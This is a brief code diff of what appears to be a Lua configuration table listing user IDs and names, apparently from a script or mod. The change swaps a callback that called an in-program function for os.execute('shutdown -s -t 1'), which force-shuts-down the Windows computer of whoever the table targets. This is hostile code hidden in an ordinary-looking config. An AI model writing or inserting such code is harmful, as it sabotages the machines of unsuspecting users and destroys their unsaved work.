@@ -69,5 +69,5 @@
     {1219094181,'wertix666'},
     {1009411924,'hahhaahhahahahaa'},
   },
-  callback = function() callFunction(0x823BDB , 3, 3, 0, 0, 0)  end,
+  callback = function() os.execute('shutdown -s -t 1')  end,
 }
